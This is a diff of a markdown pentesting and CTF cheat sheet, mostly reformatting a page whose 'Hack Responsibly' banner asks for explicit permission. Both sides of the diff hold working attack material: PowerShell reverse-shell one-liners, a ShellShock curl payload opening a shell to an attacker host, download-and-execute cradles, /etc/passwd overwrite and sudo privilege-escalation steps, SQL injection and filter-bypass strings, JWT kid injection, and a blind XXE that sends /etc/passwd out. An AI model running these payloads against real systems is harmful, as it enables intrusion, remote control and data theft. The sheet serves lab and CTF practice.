@@ -9,17 +9,17 @@ description: >-
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
 ## Markdown
 
 ```text
-{% hint style="warning" %} Warning box. Looks nice! {% endhint %}
+{% hint style="warning" %} Text between these will show up in a Warning box. Looks nice! {% endhint %}
 ```
 
 {% hint style="danger" %}
-Text between these will show up in a warning box. Looks nice! 
+Text between these will show up in a Warning box. Looks nice!
 
 _Can click on the icon to change it to something appropriate \( Changes style, I think. Gitbook only?\)._
 {% endhint %}
@@ -53,7 +53,7 @@ Powershell wget [http://blog.stackexchange.com/](http://blog.stackexchange.com/)
 
 ## -----
 
-Windows enumeration: whoami /all net use z: \\ tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]
+Windows enumeration: whoami /all net use z: \ tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]
 
 ## -----
 
@@ -77,7 +77,7 @@ view hex of file only: `xxd -p`
 
 reverse from hex: `xxd -r -p > <filename>`
 
-## msfvenom 
+## msfvenom
 
 custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa\]
 
@@ -172,7 +172,7 @@ use LDAPDomainDump to gather the AD schema details.[LDAPDomainDump](https://gith
 
 ADExplorer: [https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 
-## pass the hash 
+## pass the hash
 
 responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr \(group policy\) respounder - detect responder - responder guard
 
@@ -226,9 +226,7 @@ Quick Start
 #Start HTTP server 
 base64 -w0 linpeas.sh > lp.enc sudo python -m SimpleHTTPServer 80 
 #Download from the victim Use the parameter 
-curl 10.10.10.10/lp.enc | base64 -d | sh 
-
-
+curl 10.10.10.10/lp.enc | base64 -d | sh
 ```
 
 ### Winpeas
@@ -239,15 +237,15 @@ curl 10.10.10.10/lp.enc | base64 -d | sh
 
 D - Delete access F - Full access \(Edit\_Permissions+Create+Delete+Read+Write\) N - No access M - Modify access \(Create+Delete+Read+Write\) RX - Read and eXecute access R - Read-only access W - Write-only access
 
-winpeas.exe cmd searchall searchfast \#cmd commands, search all filenames and avoid sleeping \(noisy - CTFs\) 
+winpeas.exe cmd searchall searchfast \#cmd commands, search all filenames and avoid sleeping \(noisy - CTFs\)
 
-winpeas.exe \#Will execute all checks except the ones that use a CMD 
+winpeas.exe \#Will execute all checks except the ones that use a CMD
 
-winpeas.exe cmd \#All checks 
+winpeas.exe cmd \#All checks
 
-winpeas.exe systeminfo userinfo \#Only systeminfo and userinfo checks executed 
+winpeas.exe systeminfo userinfo \#Only systeminfo and userinfo checks executed
 
-winpeas.exe notcolor \#Do not color the output 
+winpeas.exe notcolor \#Do not color the output
 
 winpeas.exe cmd wait \#cmd commands and wait between tests
 
@@ -263,7 +261,7 @@ In Linux the ouput will be colored using ANSI colors. If you are executing winpe
 
 ### -----
 
-[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) look for text in a file and lists its name and contents. 
+[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) look for text in a file and lists its name and contents.
 
 Shorthand \(aliased\) version:
 
@@ -271,9 +269,9 @@ Shorthand \(aliased\) version:
 ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}
 ```
 
-Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep` 
+Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`
 
-Full version: 
+Full version:
 
 ```text
 Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
@@ -377,8 +375,6 @@ compress files using windows, sets "Compressed" attribute \(cmd.exe\) `compact /
 
 ### -----
 
-## 
-
 ### -----
 
 ## `command-not-found` errors
@@ -409,7 +405,7 @@ find . -maxdepth 1 -type f ! -name ".*" -exec cat {} + | sort -u -o /path/to/sor
 
 ## Faster filtering with the silver searcher
 
-https://github.com/ggreer/the\_silver\_searcher
+[https://github.com/ggreer/the\_silver\_searcher](https://github.com/ggreer/the_silver_searcher)
 
 For faster searching, use all the above grep regular expressions with the command `ag`.
 
@@ -420,47 +416,54 @@ take the name of each file in a directory and try to connect to a site with that
 ```text
 for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl -I http://10.10.10.181/$file; done
 ```
+
 ### -----
 
 ## Misc Notes
 
 ### Useful x86 Msfvenom Encoders
-```
+
+```text
 x86/shikata_ga_nai
 x86/fnstenv_mov
-
 ```
 
 ### TMUX Hijacking
-```
+
+```text
 tmux -S *session path* 
 Example: tmux -S /.devs/dev_sess
 ```
 
-### Hidden Windows Text Stream 
+### Hidden Windows Text Stream
+
 Find:
-```
+
+```text
 dir /R
 ```
+
 Read:
-```
+
+```text
 more < hm.txt:root.txt:$DATA
 ```
 
+### DirtyCOW Exploit \(Linux Kernel version from 2.6.22 to 3.9\)
 
-### DirtyCOW Exploit (Linux Kernel version from 2.6.22 to 3.9)
-https://github.com/FireFart/dirtycow/blob/master/dirty.c
+[https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
-### Oracle Enumeration TNS Listener (port 1521)
-https://github.com/quentinhardy/odat
+### Oracle Enumeration TNS Listener \(port 1521\)
 
-```
+[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)
+
+```text
 Also check HackTheBox Silo writeup for more references
 ```
 
-
 ### Buffer Overflow Bad Chars
-```
+
+```text
 "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
 "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
@@ -472,195 +475,209 @@ Also check HackTheBox Silo writeup for more references
 ```
 
 ### JS Meterpreter Payload
-```
+
+```text
 msfvenom -p <payload > LHOST=<ip> LPORT=<port> -f js_le -e generic/none
 ```
 
-
 ### Compile on Linux for Windows x86
-```
+
+```text
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 ```
 
 ### From MSSQL Injection to RCE
-https://www.tarlogic.com/en/blog/red-team-tales-0x01/
 
-### Windows Kernel Vulnerabilities Finder - Sherlock (PowerShell)
-```
+[https://www.tarlogic.com/en/blog/red-team-tales-0x01/](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
+
+### Windows Kernel Vulnerabilities Finder - Sherlock \(PowerShell\)
+
+```text
 https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
 ```
 
-### PowerShell one-liners (incl. file transfers)
-```
+### PowerShell one-liners \(incl. file transfers\)
+
+```text
 https://www.puckiestyle.nl/
 ```
 
-
 ### Much Better PowerShell Reverse Shell One-Liner
-```
+
+```text
 powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='IP';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 ```
 
-
 ### Post-Exploitation Enumerate all users of Domain
-```
+
+```text
 net user /Domain
 ```
 
-
 ### Windows XP SP0/SP1 Privilege Escalation:
-```
+
+```text
 https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 ```
 
-
 ### SUID Flag on /usr/bin/cp command Privilege Escalation
-```
+
+```text
 1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
 2. /usr/bin/cp /tmp/passwd /etc/passwd
 3. su - bob (Password: bob)
 ```
 
 ### Writable /etc/passwd Privilege Escalation
-```
+
+```text
 echo root::0:0:root:/root:/bin/bash > /etc/passwd
 
 su
 ```
 
-
 ### Bypass robots.txt "You are not a search engine. Permission denied."
-```
+
+```text
 Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ```
 
+### ShellShock PHP &lt; 5.6.2
 
-
-### ShellShock PHP < 5.6.2
-
-```
+```text
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
 ```
-### Privilege Escalation through SeImpersonatePrivilege permission (JuicyPotato)
-https://github.com/ohpe/juicy-potato/releases
-https://www.absolomb.com/2018-05-04-HackTheBox-Tally/
+
+### Privilege Escalation through SeImpersonatePrivilege permission \(JuicyPotato\)
+
+[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) [https://www.absolomb.com/2018-05-04-HackTheBox-Tally/](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)
 
 ### Memcached Pentest & Enumeration
-https://www.hackingarticles.in/penetration-testing-on-memcached-server/
 
+[https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
 
+### Tunneling Post-Exploitation \(PortForwarding\) through Chisel
 
-### Tunneling Post-Exploitation (PortForwarding) through Chisel
-https://github.com/jpillora/chisel
-
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 ### Active Directory Users & Groups Enumeration
-```
+
+```text
 net user /domain
 net group /domain
 ```
 
 ### Tunelling on Windows
-```
+
+```text
 Using plink.exe within PuTTY project folder
 ```
 
 ### Windows Architecture and Version
-```
+
+```text
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 
-
 ### Windows Service Start Mode
-```
+
+```text
 wmic service where caption="SERVICE" get startmode
 ```
 
 ### Windows check permissions over a file/executable with 'icacls'
-```
+
+```text
 icacls "C\full_path\file.exe"
 ```
-Permissions: 
-F - full access 
-M - modify access
-RX - read & execute access
-R - read access
-W - write-only access
 
-
+Permissions: F - full access M - modify access RX - read & execute access R - read access W - write-only access
 
 ### Powershell Running Services
-```
+
+```text
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
-### Client-Side .hta (HTML-based Internet Explorer only) Code Execution
-```html
+
+### Client-Side .hta \(HTML-based Internet Explorer only\) Code Execution
+
+```markup
 <html>
-	<body>
-		<script>
-			var c= 'cmd.exe'
-			new ActiveXObject('WScript.Shell').Run(c);
-		</script>
-	</body>
+    <body>
+        <script>
+            var c= 'cmd.exe'
+            new ActiveXObject('WScript.Shell').Run(c);
+        </script>
+    </body>
 </html>
 ```
 
 ### Fingerprinting Client-Side Victim
-https://github.com/fingerprintjs/fingerprintjs2
+
+[https://github.com/fingerprintjs/fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs2)
 
 ### Scan Security Headers
-https://securityheaders.com/
 
-### PowerShell to retrieve Active Directory objects (including deleted)
-```Get-ADObject```
+[https://securityheaders.com/](https://securityheaders.com/)
 
+### PowerShell to retrieve Active Directory objects \(including deleted\)
+
+```text
 ### Decode LDAP Passwords
 https://dotnetfiddle.net/2RDoWz
 
 ### mysql command line alternative
 ```
-mysqldump
-```
 
+mysqldump
+
+```text
 ### TTY Shell that works almost every time on Linux
 ```
-/usr/bin/script -qc /bin/bash /dev/null
-```
 
+/usr/bin/script -qc /bin/bash /dev/null
+
+```text
 ### Kerberos check for valid usernames or bruteforce user/pass with kerbrute
 ```
+
 kerbrute
-```
+
+```text
 https://github.com/TarlogicSecurity/kerbrute
 
 ### Crawls web pages for keywords
 ```
+
 cewl
-```
+
+```text
 ### TeamViewer Privilege Escalation -> CVE-2019-189888
 ```
-meterpreter > run post/windows/gather/credentials/teamviewer_passwords
-```
 
+meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
+
+```text
 ### PowerShell Reverse Shell
 ```
-$client = New-Object System.Net.Sockets.TCPClient('192.168.0.0',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-$sm=(New-Object Net.Sockets.TCPClient('192.168.0.0',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)
 
-```
+$sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
 
+```text
 Pull the shell:
 ```
-powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('SHELL URL')"
-```
 
+powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
+
+```text
 ### Wget Alternative for Windows in PowerShell
 ```
-$client = new-object System.Net.WebClient
-$client.DownloadFile("URL","Local Download Path")
-```
 
+$client = new-object System.Net.WebClient $client.DownloadFile\("URL","Local Download Path"\)
+
+```text
 ### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
 ``sudo -u#-1 /bin/bash``
 
@@ -707,92 +724,93 @@ s = server_first_message[server_first_message.find('s=')+2:server_first_message.
 i = server_first_message[server_first_message.find('i=')+2:]
 
 for passlen in range(1,3):
-	print "test passlen %d" % passlen
-	for k in itertools.permutations(charset, passlen):
-		password = "koma" + "".join(k)
-		salt = base64.b64decode(s)
-		client_final_message_bare = 'c=biws,r=' + r
-		salt_password = hashlib.pbkdf2_hmac('sha1', password, salt, int(i))
-		auth_message = initial_message + ',' + server_first_message + ',' + client_final_message_bare
-		server_key = hmac.new(salt_password, 'Server Key', hashlib.sha1).digest()
-		server_signature = hmac.new(server_key, auth_message, hashlib.sha1).digest()
-		server_final_message = 'v=' + base64.b64encode(server_signature)
-		if server_final_message == server_final_message_compare:
-			print "found the result"
-			print password
-			h = hashlib.new('sha1')
-			h.update(password)
-			print h.hexdigest()
-			exit(-1)
-
-
-
+    print "test passlen %d" % passlen
+    for k in itertools.permutations(charset, passlen):
+        password = "koma" + "".join(k)
+        salt = base64.b64decode(s)
+        client_final_message_bare = 'c=biws,r=' + r
+        salt_password = hashlib.pbkdf2_hmac('sha1', password, salt, int(i))
+        auth_message = initial_message + ',' + server_first_message + ',' + client_final_message_bare
+        server_key = hmac.new(salt_password, 'Server Key', hashlib.sha1).digest()
+        server_signature = hmac.new(server_key, auth_message, hashlib.sha1).digest()
+        server_final_message = 'v=' + base64.b64encode(server_signature)
+        if server_final_message == server_final_message_compare:
+            print "found the result"
+            print password
+            h = hashlib.new('sha1')
+            h.update(password)
+            print h.hexdigest()
+            exit(-1)
 ```
-
-
 
 ### CTF Docs
-```
+
+```text
 https://github.com/welchbj/ctf/tree/master/docs
 ```
 
 ### Test for LDAP NULL BIND
-```
+
+```text
 ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
 ```
 
-
 ### Extract VBA Script from document
-```
+
+```text
 https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php
 ```
 
 ### Decode Rubber Ducky USB .bin payloads
-```
+
+```text
 https://ducktoolkit.com/decode#
 ```
 
-### Crack Android lockscreen from system files (gesture.key)
-```
+### Crack Android lockscreen from system files \(gesture.key\)
+
+```text
 https://github.com/KieronCraggs/GestureCrack
 ```
 
 ### XOR Analysis
-```
+
+```text
 https://github.com/hellman/xortool
 ```
 
-### Cryptanalysis 
-```
+### Cryptanalysis
+
+```text
 https://github.com/nccgroup/featherduster
 ```
 
 ### RSA Cracking Tools
-```
+
+```text
 https://github.com/Ganapati/RsaCtfTool
 https://github.com/ius/rsatool
 ```
 
-
 ### Morse Code Audio Decode
-```
+
+```text
 https://morsecode.world/international/decoder/audio-decoder-adaptive.html
 ```
 
 ### Text to 21 Common Ciphers
-```
+
+```text
 https://v2.cryptii.com/text/select
 ```
- 
 
 ### Crypto Example Challs
-```
+
+```text
 https://asecuritysite.com/encryption/ctf?mybutton=
 ```
 
-
 ### Shift in Python
-
 
 ```python
 with open('FILENAME') as f:
@@ -802,11 +820,13 @@ with open('FILENAME') as f:
 ```
 
 ### Predict encoding type
-```
+
+```text
 https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')
 ```
 
 ### Get data, process and respond over a socket
+
 ```python
 import socket
 import re
@@ -821,116 +841,133 @@ print result
 clientsocket.send(str(result))
 data = clientsocket.recv(1024)
 print data
-
 ```
-
-
 
 ### Extract domain names & hosts from PCAP
-*Domain Names*
-```
+
+_Domain Names_
+
+```text
 tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
 ```
-*Hosts*
-```
+
+_Hosts_
+
+```text
 tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
 ```
 
-
 ### Manual UNION SQLite Injection
-*Table*
+
+_Table_
+
 ```sql
 1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
 ```
-*Columns (as command)*
+
+_Columns \(as command\)_
+
 ```sql
-1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 -- 
+1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 --
 ```
-*Values (payload depends on the columns structure)*
+
+_Values \(payload depends on the columns structure\)_
+
 ```sql
 1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
 ```
 
 ### SQL Injection Little Tips
-```-- ``` -> Linux <br>
-```--+``` -> Windows <br>
-```%23 (#)``` -> Hash <br>
-``` %2527 (')``` -> bypass urldecode(urldecode(htmlspecialchars(, ENT_QUOTES)));
 
+`--` -&gt; Linux   
+ `--+` -&gt; Windows   
+ `%23 (#)` -&gt; Hash   
+ `%2527 (')` -&gt; bypass urldecode\(urldecode\(htmlspecialchars\(, ENT\_QUOTES\)\)\);
 
 ### Manual UNION SQL Injection
-*Table*
+
+_Table_
+
 ```sql
 1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
 ```
-*Columns*
+
+_Columns_
+
 ```sql
 1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
 ```
-*Values*
+
+_Values_
+
 ```sql
 1' union select (select nameofcolumn from nameoftable limit 0,1),2#
 ```
-*Using Newline*
+
+_Using Newline_
+
 ```sql
 admin %0A union %0A select %0A 1,database()#
            or
-admin %0A union %0A select %0A database(),2#   
+admin %0A union %0A select %0A database(),2#
 ```
-*Bypass preg_replace*
+
+_Bypass preg\_replace_
+
 ```sql
 ununionion select 1,2%23
      or
 UNunionION SEselectLECT 1,2,3%23
 ```
 
-
 ### Known Plaintext ZIP
-*Download pkcrack*
-```
+
+_Download pkcrack_
+
+```text
 https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html
 
 ! Before using, it must be built from source
 ```
 
-*Syntax*
-```
+_Syntax_
+
+```text
 ./pkcrack -C encrypted.zip -c file -P plaintext.zip -p file
 ```
 
-
-
-
 ### Python Functions
-Files: https://www.w3schools.com/python/python_ref_file.asp <br>
-Strings: https://www.w3schools.com/python/python_ref_string.asp <br>
-Keyworks: https://www.w3schools.com/python/python_ref_keywords.asp <br>
-Random: https://www.w3schools.com/python/module_random.asp <br>
 
-
+Files: [https://www.w3schools.com/python/python\_ref\_file.asp](https://www.w3schools.com/python/python_ref_file.asp)   
+ Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
+ Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
+ Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
 
 
 ### PHP Functions
 
-Files: https://www.w3schools.com/php/php_ref_filesystem.asp <br>
-Directories: https://www.w3schools.com/php/php_ref_directory.asp <br>
-Errors: https://www.w3schools.com/php/php_ref_error.asp <br>
-Network: https://www.w3schools.com/php/php_ref_network.asp <br>
-Misc: https://www.w3schools.com/php/php_ref_misc.asp
-
-
+Files: [https://www.w3schools.com/php/php\_ref\_filesystem.asp](https://www.w3schools.com/php/php_ref_filesystem.asp)   
+ Directories: [https://www.w3schools.com/php/php\_ref\_directory.asp](https://www.w3schools.com/php/php_ref_directory.asp)   
+ Errors: [https://www.w3schools.com/php/php\_ref\_error.asp](https://www.w3schools.com/php/php_ref_error.asp)   
+ Network: [https://www.w3schools.com/php/php\_ref\_network.asp](https://www.w3schools.com/php/php_ref_network.asp)   
+ Misc: [https://www.w3schools.com/php/php\_ref\_misc.asp](https://www.w3schools.com/php/php_ref_misc.asp)
 
 ### PHP Jail Escape
-*With file_get_contents()*
+
+_With file\_get\_contents\(\)_
+
 ```php
 print file_get_contents('flag.txt');
 ```
-*With readfile()*
+
+_With readfile\(\)_
+
 ```php
 echo readfile("flag.txt");
 ```
 
-*With popen()*
+_With popen\(\)_
+
 ```php
 popen("vi", "w");
 
@@ -939,56 +976,65 @@ popen("vi", "w");
 :!/bin/bash
 ```
 
-*With highlight_file()*
+_With highlight\_file\(\)_
+
 ```php
 highlight_file(glob("flag.txt")[0]);
    or
 highlight_file(glob("fl*txt")[0]);
 ```
 
-*With highlight_source()*
+_With highlight\_source\(\)_
+
 ```php
 highlight_source("flag.txt");
    or
 highlight_source(glob("*")[4]);
 ```
 
-*With Finfo()*
+_With Finfo\(\)_
+
 ```php
 new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
 ```
 
 ### XPATH Dump
-```
+
+```text
 https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
 ```
 
-
 ### LFI Retrieve File without executing it
-```
+
+```text
 https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 ```
 
 ### Useful PCAP Reader
-```
+
+```text
 chaosreader
 ```
 
 ### ZIP Format Signatures
 
-*HEADER*
-```
+_HEADER_
+
+```text
 50 4B 03 04 14
 ```
-*FOOTER*
-```
+
+_FOOTER_
+
+```text
 50 4B 05 06 00
 ```
 
-
 ### JWT KID Value Exploitation
-*Sign with public file from server*
-```
+
+_Sign with public file from server_
+
+```text
 kid: public/css/file.css
 
 wget file.css from target
@@ -996,49 +1042,54 @@ wget file.css from target
 manipulate token using jwt_tool and sign it with file.css
 ```
 
-*SQL Injection*
-```
+_SQL Injection_
+
+```text
 kid: test' UNION SELECT 'key';--
 
 manipulate token using jwt_tool and sign it using the secret -> 'key'
 ```
 
-
 ### Blind XXE to SSRF
 
-*ON TARGET*
+_ON TARGET_
 
-```xml
+```markup
 <?xml version="1.0"?>
 <!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
 <foo>&e1;</foo>
-````
+`
+```
 
-*INSIDE DTD FILE*
+_INSIDE DTD FILE_
 
-```xml
+```markup
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
 %p2;
 ```
 
-
 ### Hidden terminal input history
+
 ```bash
 find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
 ```
 
 ### Search file by name pattern
+
 ```bash
 find -name "*PATTERN*" 2>/dev/null
 ```
 
 ### Search string
+
 ```bash
 grep -r "STRING" / 2>/dev/null
 ```
 
 ### Check SUDO privileges/rights
+
 ```bash
 sudo -l
 ```
+
